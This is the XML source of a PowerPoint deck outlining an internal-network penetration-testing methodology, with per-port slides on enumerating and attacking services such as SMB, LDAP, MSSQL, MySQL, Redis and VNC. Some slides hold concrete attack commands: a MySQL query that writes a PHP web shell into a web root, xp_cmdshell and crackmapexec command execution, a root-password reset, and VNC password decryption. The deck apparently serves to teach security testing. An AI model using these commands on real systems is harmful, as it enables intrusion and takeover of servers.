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1CCFB4-0D65-4FA0-A358-C0FADF23916B}">
          <p14:sldIdLst/>
        </p14:section>
        <p14:section name="Reconnaissance" id="{D0B0F984-86FE-4586-A954-C24A9A066989}">
          <p14:sldIdLst>
            <p14:sldId id="266"/>
            <p14:sldId id="267"/>
            <p14:sldId id="259"/>
            <p14:sldId id="260"/>
            <p14:sldId id="261"/>
            <p14:sldId id="262"/>
            <p14:sldId id="263"/>
            <p14:sldId id="264"/>
            <p14:sldId id="265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54A2-A066-1C4E-D079-140779C34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E568E-019E-325C-23F6-E3E2BAF11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7E8BC-8BE7-603D-4054-DAF01968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6553E-4E5D-0BBA-CE23-62C3C317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82931-9810-94F0-8DBC-4FB78536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23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0A2B-9434-2973-DCFA-EA8F4FD2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48FC8-292C-8BC6-E263-BD325FDE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794EA-0C2B-FDF8-7540-E1966EF9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78EC1-36A8-68C3-1808-DF7C12E1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A324E-96F3-DCC8-C70F-902D4D59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1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3559-60E5-4BFF-87FD-78352E98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87A94-5B28-7192-CBFD-C049E0D15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06D9-6AC9-0FA6-0245-B28E258B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16B67-7AF8-0212-06BD-0F651FA3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87EE2-7F77-F724-881E-0A428793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8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A431-5ED7-4725-245D-48BF9917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B0330-95B3-A565-94C8-1232469B7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EFCF4-7FE2-433B-8602-8FE4AB178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58864-126A-31F2-08D5-F757A000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BE24F-73F1-D60E-CA2A-15727F83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C41FA-4ABD-9C58-657E-AD2BB090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039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729C-4974-351D-3319-79DAC989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22DD4-AB73-7933-9F66-78D19F9AB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439DF-4301-C05D-6156-66239E8FC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D31C9-16E7-462A-3DA4-6FA85F945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D7441-AB0C-2064-AC5D-64D740748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7416B-E59E-D38D-187B-60F76F12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893D1-A301-8DF2-0C29-97ECE8E9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16D1E-E626-9619-DA41-9ADC7E96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60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2AEF-F15A-D045-F882-284A927D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9D848-A8BA-782D-E27F-1ACD624D4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2D0CD-CCF6-2E6A-520D-ADDDB17C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DD8B9-27C5-B194-8773-992A3EDB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02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7C467-FA74-6E29-0963-3B23FA0E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2F9D7-55DF-BD91-524A-04C06041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A2D5C-9578-3F28-0624-DCA80513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65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35AB-6E77-35F0-6976-F9F31CEC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B28D-4178-126A-C911-076F0FF5D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8295A-A6AD-6A71-846D-7503CD9B7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521CE-BFCF-9AD8-9806-EC851D0F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F7F3E-336C-BCA2-E2C7-10457377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ED3F4-C566-3998-D952-B6E2358A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22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AA1F-7658-CDC6-2719-3923D9BF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EF3665-7737-6F07-9DBC-49C4A222A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63369-36A9-C886-127F-38FD339E2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92C26-D37F-0016-6152-06FE3465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BAC52-4FE7-65AD-7927-520A0936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3018A-843B-303F-C42A-39143E10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20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BECF-2DC7-3E28-433D-EC6B8A02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8FC29-EA99-EA53-A167-54D7EA805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927FA-8352-F83D-D949-510D4A23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6ABA9-0DEB-15D1-0CF9-BFA94A3C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C4C94-54C7-98C0-9177-A2E3EEFE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39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AEA42-929A-7A7B-79A4-81EE3AD15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DF476-E59C-BC9C-3530-7EB0D609D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56F5-B0F5-8D6A-1033-91C637DD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9656-4666-5646-772B-E7624ACFF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E5C4-0EEA-FD78-3BF9-5668B1F4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91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26F8F-FA29-23EC-74F8-48E9D033C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E2648-4E44-E798-7A30-9677F576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48114-A39F-1954-9C24-20E973A0F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44BCF-C0D2-4594-AC58-E21CA0B4C91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9FE30-F0BD-3825-39DC-D51706DD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569CC-D0B5-6FE9-3B50-AF846AADD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5004A-2D10-4A1E-8889-64F71C672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13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7498-1643-FF09-5691-8612F12F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3DE2-2247-7F06-2A8A-569F3185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Internal Infrastructure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AA46D-3E96-E80D-0CEC-2D7BB6A59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Using responder in analyse mode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Using Wireshark for monitoring network traffic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Performing Network Range Scan</a:t>
            </a:r>
          </a:p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22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BFEA-C265-EC34-CAC2-93DC257B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8D84-3F44-BEAB-46A4-38195C21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Fingerprinting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3DD78-1A72-0C7F-7E0B-8EC98A272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Performing WhoIs on IP’s?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Performing ASN discovery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Gathering DNS records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Bruteforce hostnames with DNS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Google Dorking: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Site: &lt;Domain&gt;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Filetype: &lt; “xls | doc | pdf”&gt;, site: &lt;Domain&gt;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Filetype: &lt; “xls | doc | pdf”&gt;, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN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inurl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: sitemap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Reverse DNS lookup</a:t>
            </a:r>
          </a:p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0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02AE-3A5F-33DB-987C-15A1F359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697D-192C-B491-03E1-512286DA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Mapping Network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67E7E-C69C-A87A-C1AE-35D25E47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Identifying Live Hosts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Port Scan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Service scan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Version scan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Scanning with NSE/Scripts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OS scan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UDP as well as TCP scan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SNMP Enumeration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SNMPCheck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SNMPWalk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NetBIOS Enumeration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NBTScan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NMBlookup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Visualizing Network on MindMaps</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3488003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1B2D-7347-4A63-7542-2C7A57CE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478C-1AC8-FEB0-1AD0-C9E52BA2E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Vulnerability Assessment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679CC-A4D1-A617-80CF-7256E9216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 numCol="2"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FTP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SSH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SMTP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DNS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Azure DevOps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IIS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Kerberos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RPC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Rusersd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NFS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LDAP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SMB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MSSRPC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RTSP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MSSQL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MySQL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PostgreSQL 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VNC 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Redis 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PJL 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Memcache </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7784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547D-3FC2-535A-BDCD-996469A3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74B5-FCCF-708D-0CEE-20EDE4B90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FTP/21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87236-46A5-E919-736A-1F105CEC7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Grabbing Banner for Versions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Anonymous Login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FTP Bounce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Default or Guessable Passwords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85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25F5-7ECD-EC4B-9437-80633DFE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33D4-9276-FD29-8E15-244EE089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SSH/22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6CDED-3C6B-DF7F-897F-BC2B8D8CD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Grabbing Banner for Versions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Null Password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Default or Guessable Passwords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434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DB26-8BFD-B5B9-45C8-292701E1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A8ED-0B63-E3A1-B558-C03BE36C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SMTP/25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A80FF-6B77-BAD0-59C1-75DE917DE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Grabbing Banner for Versions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Connect with Telnet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SMTP Relay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User Enumeration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5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3FDF0-BFF3-8EA0-0CDF-F39311FA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6BFE-2011-3669-01E8-052ABB7D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DNS/53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29E1-7F4C-A114-0680-8475A57F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DNS Hostname Bruteforce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DNS Reverse Lookup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DNS Service Record Enumeration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DNS Service Discovery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DNS Zone Transfer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="346989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5A10-ED2C-FF00-6A54-48F1C3DF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64F1-915D-02DC-6C94-3C776517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Azure DevOps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0BC1F-7AD0-6B31-CE9A-CE5D99B5B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Pages accessible without authentication like people, async people, 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Vulnerable Versions Exploitation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https://github.com/gquere/pwn_jenkins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71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B9050-D745-1958-3610-BFEC44EE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4696-AFAA-5ADC-3B88-F5E43EF54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ISS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1A80-49B6-D31A-CD2F-C44C56C0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Enumerating .config files</a:t>
            </a:r>
          </a:p>
          <a:p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Trace.AXD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enabled debugging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Path Traversal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Source Code Disclosure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Downloading DLLs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System.Web.Routing.dll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System.Web.Optimization.dll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System.Web.Mvc.dll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System.Web.Mvc.Ajax.dll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System.Web.Mvc.Html.dll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Microsoft IIS tilde character “~” Vulnerability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Basic Authentication bypass (IIS 7.5) by trying to access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/admin:$i30:$INDEX_ALLOCATION/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admin.php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/admin::$INDEX_ALLOCATION/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admin.php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Grabbing Banner for Version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Directory Bruteforce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8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F902-D1E4-7936-BD28-6B43F69D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64EF-C1CE-D92B-5B7A-441613A92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Kerberos/88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74CF6-B8C2-BE9C-487A-25407E527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Active Directory Attacks (We're not going to cover this here)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Bruteforcing Usernames with nmap:  krb5-enum-users.nse</a:t>
            </a:r>
          </a:p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40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EBD6-B5F2-AA6C-DB2E-9D9F7C49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909D-DC3F-9179-D708-DA62065B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RPC/111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79004-C546-031D-49AC-131F7AC42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Enumerating Basic Information using rpcinfo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Connect to RPC with RPC Client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05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906E-C5DB-C0B2-3F5D-1B1DF1AE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300A-2152-2B55-F72E-1098E97D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Rusersd/1026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56118-BC8C-E4A0-48D0-D1DC5E8CC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Enumerating users with rusers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3614047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862D-B9FE-3C92-CB4F-155A9687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BCD3F-99B0-6D45-3D2A-ED5AB4D6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NFS/2049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1863-83EA-A7CF-A2A6-6C0419E0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Checking for Accessible mounts: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1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showmount –e &lt;IP&gt;</a:t>
            </a:r>
          </a:p>
          <a:p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Mounting: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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mount -t nfs [-o vers=2] &lt;ip&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock</a:t>
            </a:r>
          </a:p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56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556D3-7E9B-D7C4-630C-AB9480DF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CCB2-F60B-4C30-DF6A-42EFE483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LDAP/389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F35FA-62CF-F56E-964D-EA3C608DD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Listing public information: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nmap -n -sV --script "ldap* and not brute" (IP)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="16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Checking Null Credentials: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-H ldap://ldap.example.com -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com" "(objectClass=*)"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Users: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"(objectClass=person)"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Computers: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"(objectClass=computer)"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my info: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"(objectClass=person)" cn mail uid</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="16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Domain Admins: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"(cn=Domain Admins)" member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Enterprise Admins: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"(cn=Enterprise Admins)" member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Administrators: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR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"(adminRole=*)"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Remote Desktop Groups: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ldapsearch -x -b "dc=example,dc=com" -H ldap://ldap.example.com "(cn=Remote Desktop Users)" member</a:t>
            </a:r>
          </a:p>
          <a:p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30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1560-E167-2BA5-7051-23E01CA6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80E7-9185-0776-958E-805566B2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SMB/445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FA64-0F81-3C58-2F49-D227515D3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Anonymous credentials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Grabbing banners for versions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Null sessions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Exploitation with RPCClient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List users: enumdomusers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user details: queryuser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user groups: queryusergroups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sid of user: lookupnames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users aliases: queryuseraliases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List groups: enumdomgroups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group details: querygroup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group members: querygroupmem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List alias: enumalsgroups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members: queryaliasmem builtin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List domains: enumdomains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Get sid: lsaquery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Domain info: querydominfo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Find sid by name: lookupnames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Find more sid’s: lsaenumsid</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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RID cycle (check more sid’s): lookupsid</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="266638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4765-AE1F-4F5F-A148-43743AFF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A7EE-F8ED-4111-CC12-01AEFE11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SMB/445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0A958-7A13-B1C5-4D5B-82ECE4128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Listing fileshares: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1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Null session: smbclient –no-pass –L //&lt;IP&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1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Listing shares with credentials: smbclient –U ‘username[%password]’ –L [--pw-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-hash] //&lt;IP&gt;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Mount fileshares</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1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Without credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1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With credentials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SMB Relay Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1920419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DE3BF-34C5-C1C8-B258-7FBFDB28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F744-CD56-BD2D-0779-789DD323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MSSRPC/135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F185-5209-4EEB-AF53-2F3B63D3C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Endpoint mapper service discovery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Hidden DCERPC server discovery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Remote management interface discovery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DCERPC TCP service auditor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433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F155-08B2-EC2E-D9A5-4E68916C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9693-BDDD-1CF1-79E7-9D15E678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RTSP/554 or 8554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6C0A0-722F-4E40-ADE7-1AD03ECA7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Gathering RTSP methods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RTSP URL Bruteforce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Cameradar can be used to access RTSP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054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9922-6148-A374-48B3-0C1361DDE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7351-8D8C-23FC-1F52-40433742F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MSSQL/1433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5E2F-9DAF-92B2-8802-C17F08CB2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Banner grabbing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Basic information gathering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nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-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args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mssql.instance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-port=1433,mssql.username=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sa,mssql.password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=,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mssql.instance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name=MSSQLSERVER -sV -p 1433 IP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Execute Commands with MSSQL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Authenticated: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crackmapexec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-d Domain name&gt; -u -p -x "id“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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UnAuthenticated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If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xp_cmdshell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is enabled, we can execute commands without authentication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MSSQL Privilege Escalation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auxiliary/admin/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mssql_escalate_dbowner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auxiliary/admin/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mssql_escalate_execute_as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541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7494-6B1A-1D81-0F57-E0387B24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5EEE-62FC-8626-5CE5-80499192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MySQL/3306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EB49E-F649-E01B-6625-640EF17DD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Enumerating with nmap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Banner Grabbing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Basic Commands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Enumerating Privileges: select grantee,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table_schema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privilege_type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FROM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schema_privileges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Enumerating File Privileges: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user,file_priv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from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mysql.user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where user='root’;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Enumerating Current User: select user();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Writing File: select 1,2,"?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php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echo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shell_exec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($_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GET'c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']);?",4 into OUTFILE 'C/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xampp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htdocs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shell.php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’;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Reading file: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load_file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('/home/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purabparihar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/read_file.txt’);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User password change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UPDATE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mysql.user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SET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authentication_string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=PASSWORD'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MyNewPass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') WHERE User='root’;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UPDATE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mysql.user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SET Password=PASSWORD'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MyNewPass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') WHERE User='root’;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credentials:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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mysql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-u root --password=</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2407576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01421-2E79-78A5-5DEC-C56FD3CF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044A-42E8-9532-3AEF-387FE152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PostgreSQL/5432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F7E6-15DE-A7B1-0068-33EDF057F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Banner Grabbing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DB Name Flag Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="100549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D0B7-7F6B-6877-CD00-D035D8B9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DA2D2-DB20-7F3B-8765-60F41E08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VNC/5900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E208-6884-DB8E-3CE8-C121FE61C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UnAuth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VNC Access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VNC Password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Password Location Password will be encrypted)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- ~/.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vnc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/passwd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Decrypting Password: vncpwd.exe [encrypted password]</a:t>
            </a:r>
          </a:p>
          <a:p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987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8CC2-8545-5AD8-BAE5-C6FC20B0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462B-A871-7318-F6AD-19BBB762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Redis/6379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967BB-0700-F61C-4063-B121F97D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Banner grabbing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Try accessing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redis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without credentials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Enumeration after login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information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Connected Clients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– Client list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configuration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– Config get *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Dumping Database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select database with keys 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AD5D-3B91-ACEF-DD5C-F319EF21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1CAB-026F-4761-460F-0568050A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PJL/9100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B7EA8-142B-C8F3-E223-B6991D2E6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PRET can be used for interacting with PJL - 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https://github.com/RUBNDS/PRET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-I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76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9854-2072-86E7-E68A-B527E41D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C6DC-CC5D-1AC6-38BF-6AF0E687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Memcache/11211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59A9-FAB6-3547-35C6-B08CA9230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stats: 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memcstat --servers=127.0.0.1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Memcdump: memccat --servers=127.0.0.1 &lt;item3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1063627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4165-C289-6DA6-5608-F80A5DA3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093F-CCC0-BE42-B8E7-C260DF74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1D4C-7167-E5F8-8F8D-C112F930B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175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A9C2-D782-0293-974F-49A832FC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89B7-9B26-5B25-0668-0AE8F5A2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2A899-557E-8F51-6FBA-2B1E3B28A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92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2B72-3642-DAF2-30B0-BDDD76BC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A1B5-00C3-BD23-3E5D-F049BE33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23F9C-5508-0B97-CBE1-3BB189256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127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A577-3BD2-C6B3-67D9-013545C4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229A-BC4F-A592-298C-C6855BF9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1225C-B135-5BAA-A2B3-B119AF56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29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AF07A-67BE-69A7-FD68-23FF02C7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2C64-21DD-DA34-1935-A1CA1FB0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B87C9-7187-E131-AA86-1AAD2D8D0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003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E922-CD21-4341-F728-2C413C37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390A-C6B7-E1D0-53B9-277CF4FE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DE47B-1E92-831C-6B47-B3B7A02F6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289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CBF2-512A-FBAA-F55F-A3360547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36E9-A5D7-D2C1-CC06-6D8F10B4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059D2-C3E4-A1A2-4DDE-84D8A691E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384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A727-46DA-641D-BFBA-D4B80788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D11B-F145-5966-0B3F-DBEBBE0D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C212-6796-0A15-4FCA-8B31F5604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625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8853-535A-CB0D-9096-71C90EF9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2677-DA76-ECD5-6948-90311B5B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EA338-E2C6-9A73-8294-051FA5B2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7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1302</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>205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Segoe UI</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Internal Infrastructure</vt:lpstr>
      <vt:lpstr>Fingerprinting</vt:lpstr>
      <vt:lpstr>Mapping Network</vt:lpstr>
      <vt:lpstr>Vulnerability Assessment</vt:lpstr>
      <vt:lpstr>FTP/21</vt:lpstr>
      <vt:lpstr>SSH/22</vt:lpstr>
      <vt:lpstr>SMTP/25</vt:lpstr>
      <vt:lpstr>DNS/53</vt:lpstr>
      <vt:lpstr>Azure DevOps</vt:lpstr>
      <vt:lpstr>ISS</vt:lpstr>
      <vt:lpstr> Kerberos/88</vt:lpstr>
      <vt:lpstr>RPC/111</vt:lpstr>
      <vt:lpstr>Rusersd/1026</vt:lpstr>
      <vt:lpstr>NFS/2049</vt:lpstr>
      <vt:lpstr>LDAP/389</vt:lpstr>
      <vt:lpstr>SMB/445</vt:lpstr>
      <vt:lpstr>SMB/445</vt:lpstr>
      <vt:lpstr>MSSRPC/135</vt:lpstr>
      <vt:lpstr>RTSP/554 or 8554</vt:lpstr>
      <vt:lpstr>MSSQL/1433</vt:lpstr>
      <vt:lpstr>MySQL/3306</vt:lpstr>
      <vt:lpstr>PostgreSQL/5432</vt:lpstr>
      <vt:lpstr>VNC/5900</vt:lpstr>
      <vt:lpstr>Redis/6379</vt:lpstr>
      <vt:lpstr>PJL/9100</vt:lpstr>
      <vt:lpstr>Memcache/11211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polaris</dc:creator>
  <cp:lastModifiedBy>polaris my017</cp:lastModifiedBy>
  <cp:revision>82</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-04-02T03:37:05Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-06-22T06:31:47Z</dcterms:modified>
</cp:coreProperties>
</file>